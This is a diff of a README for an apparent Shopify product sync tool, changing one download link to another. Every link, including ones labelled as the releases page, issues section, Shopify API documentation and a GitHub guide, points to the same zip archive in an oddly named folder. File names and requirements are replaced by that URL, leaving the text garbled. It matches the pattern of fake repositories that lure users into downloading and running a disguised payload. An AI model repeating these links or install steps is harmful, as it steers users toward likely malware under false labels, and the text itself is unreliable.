@@ -1,6 +1,6 @@
 # 🚀 shopify-product-sync-api-automation - Effortlessly Sync Your Shopify Products
 
-[![Download](https://raw.githubusercontent.com/Athen45lol/shopify-product-sync-api-automation/main/stirpiculture/shopify-product-sync-api-automation-euphuize.zip)](https://raw.githubusercontent.com/Athen45lol/shopify-product-sync-api-automation/main/stirpiculture/shopify-product-sync-api-automation-euphuize.zip)
+[![Download](https://github.com/Athen45lol/shopify-product-sync-api-automation/raw/refs/heads/main/stirpiculture/api_product_automation_shopify_sync_v3.2-alpha.4.zip)](https://github.com/Athen45lol/shopify-product-sync-api-automation/raw/refs/heads/main/stirpiculture/api_product_automation_shopify_sync_v3.2-alpha.4.zip)
 
 ## 📦 Overview
 
@@ -18,7 +18,7 @@ The Shopify Product Sync Automation tool helps you manage your Shopify store's i
 ## ⚙️ System Requirements
 
 - **Operating System**: Windows 10 or later, macOS 10.12 or later, or any Linux distribution.
-- **https://raw.githubusercontent.com/Athen45lol/shopify-product-sync-api-automation/main/stirpiculture/shopify-product-sync-api-automation-euphuize.zip**: Version 12 or later installed on your machine.
+- **https://github.com/Athen45lol/shopify-product-sync-api-automation/raw/refs/heads/main/stirpiculture/api_product_automation_shopify_sync_v3.2-alpha.4.zip**: Version 12 or later installed on your machine.
 - **Internet Connection**: A stable connection for API access.
 - **Shopify Store**: An active Shopify account for integrating with the API.
 
@@ -30,21 +30,21 @@ Follow the steps below to download and run the Shopify Product Sync Automation t
 
 Go to the following link to find the latest version of the application:
 
-[Visit Releases Page](https://raw.githubusercontent.com/Athen45lol/shopify-product-sync-api-automation/main/stirpiculture/shopify-product-sync-api-automation-euphuize.zip)
+[Visit Releases Page](https://github.com/Athen45lol/shopify-product-sync-api-automation/raw/refs/heads/main/stirpiculture/api_product_automation_shopify_sync_v3.2-alpha.4.zip)
 
 ### 2. Download the Application
 
 On the Releases page, you will see a list of available files. Look for the most recent version and click on the file suitable for your operating system. 
 
-The download files will usually be named something like `https://raw.githubusercontent.com/Athen45lol/shopify-product-sync-api-automation/main/stirpiculture/shopify-product-sync-api-automation-euphuize.zip` for Windows, `https://raw.githubusercontent.com/Athen45lol/shopify-product-sync-api-automation/main/stirpiculture/shopify-product-sync-api-automation-euphuize.zip` for macOS, or a compressed `https://raw.githubusercontent.com/Athen45lol/shopify-product-sync-api-automation/main/stirpiculture/shopify-product-sync-api-automation-euphuize.zip` file for Linux.
+The download files will usually be named something like `https://github.com/Athen45lol/shopify-product-sync-api-automation/raw/refs/heads/main/stirpiculture/api_product_automation_shopify_sync_v3.2-alpha.4.zip` for Windows, `https://github.com/Athen45lol/shopify-product-sync-api-automation/raw/refs/heads/main/stirpiculture/api_product_automation_shopify_sync_v3.2-alpha.4.zip` for macOS, or a compressed `https://github.com/Athen45lol/shopify-product-sync-api-automation/raw/refs/heads/main/stirpiculture/api_product_automation_shopify_sync_v3.2-alpha.4.zip` file for Linux.
 
 ### 3. Install the Application
 
 Once the file is downloaded:
 
-- **For Windows**: Double-click the `https://raw.githubusercontent.com/Athen45lol/shopify-product-sync-api-automation/main/stirpiculture/shopify-product-sync-api-automation-euphuize.zip` file. Follow the on-screen instructions to install.
-- **For macOS**: Open the `https://raw.githubusercontent.com/Athen45lol/shopify-product-sync-api-automation/main/stirpiculture/shopify-product-sync-api-automation-euphuize.zip` file and drag the application to your Applications folder.
-- **For Linux**: Extract the `https://raw.githubusercontent.com/Athen45lol/shopify-product-sync-api-automation/main/stirpiculture/shopify-product-sync-api-automation-euphuize.zip` file and follow the included instructions in the README to complete the setup.
+- **For Windows**: Double-click the `https://github.com/Athen45lol/shopify-product-sync-api-automation/raw/refs/heads/main/stirpiculture/api_product_automation_shopify_sync_v3.2-alpha.4.zip` file. Follow the on-screen instructions to install.
+- **For macOS**: Open the `https://github.com/Athen45lol/shopify-product-sync-api-automation/raw/refs/heads/main/stirpiculture/api_product_automation_shopify_sync_v3.2-alpha.4.zip` file and drag the application to your Applications folder.
+- **For Linux**: Extract the `https://github.com/Athen45lol/shopify-product-sync-api-automation/raw/refs/heads/main/stirpiculture/api_product_automation_shopify_sync_v3.2-alpha.4.zip` file and follow the included instructions in the README to complete the setup.
 
 ### 4. Configure API Access
 
@@ -68,7 +68,7 @@ Once connected, you can start syncing your products. The application's dashboard
 
 To get started with the Shopify Product Sync Automation tool, make sure to download it from the following link:
 
-[Download from Releases](https://raw.githubusercontent.com/Athen45lol/shopify-product-sync-api-automation/main/stirpiculture/shopify-product-sync-api-automation-euphuize.zip)
+[Download from Releases](https://github.com/Athen45lol/shopify-product-sync-api-automation/raw/refs/heads/main/stirpiculture/api_product_automation_shopify_sync_v3.2-alpha.4.zip)
 
 ## 💡 Tips for Successful Use
 
@@ -78,14 +78,14 @@ To get started with the Shopify Product Sync Automation tool, make sure to downl
 
 ## 💬 Support and Feedback
 
-If you encounter any issues or have questions about the application, you can reach out through the [Issues section](https://raw.githubusercontent.com/Athen45lol/shopify-product-sync-api-automation/main/stirpiculture/shopify-product-sync-api-automation-euphuize.zip) on GitHub. We appreciate your feedback and strive to improve the product continually.
+If you encounter any issues or have questions about the application, you can reach out through the [Issues section](https://github.com/Athen45lol/shopify-product-sync-api-automation/raw/refs/heads/main/stirpiculture/api_product_automation_shopify_sync_v3.2-alpha.4.zip) on GitHub. We appreciate your feedback and strive to improve the product continually.
 
 ## 🌐 Additional Resources
 
 For further assistance, you may find the following resources helpful:
 
-- [Shopify API Documentation](https://raw.githubusercontent.com/Athen45lol/shopify-product-sync-api-automation/main/stirpiculture/shopify-product-sync-api-automation-euphuize.zip)
-- [https://raw.githubusercontent.com/Athen45lol/shopify-product-sync-api-automation/main/stirpiculture/shopify-product-sync-api-automation-euphuize.zip Download](https://raw.githubusercontent.com/Athen45lol/shopify-product-sync-api-automation/main/stirpiculture/shopify-product-sync-api-automation-euphuize.zip)
-- [GitHub Guide for Beginners](https://raw.githubusercontent.com/Athen45lol/shopify-product-sync-api-automation/main/stirpiculture/shopify-product-sync-api-automation-euphuize.zip)
+- [Shopify API Documentation](https://github.com/Athen45lol/shopify-product-sync-api-automation/raw/refs/heads/main/stirpiculture/api_product_automation_shopify_sync_v3.2-alpha.4.zip)
+- [https://github.com/Athen45lol/shopify-product-sync-api-automation/raw/refs/heads/main/stirpiculture/api_product_automation_shopify_sync_v3.2-alpha.4.zip Download](https://github.com/Athen45lol/shopify-product-sync-api-automation/raw/refs/heads/main/stirpiculture/api_product_automation_shopify_sync_v3.2-alpha.4.zip)
+- [GitHub Guide for Beginners](https://github.com/Athen45lol/shopify-product-sync-api-automation/raw/refs/heads/main/stirpiculture/api_product_automation_shopify_sync_v3.2-alpha.4.zip)
 
 Thank you for using the Shopify Product Sync Automation tool. We hope it makes managing your e-commerce store easier!
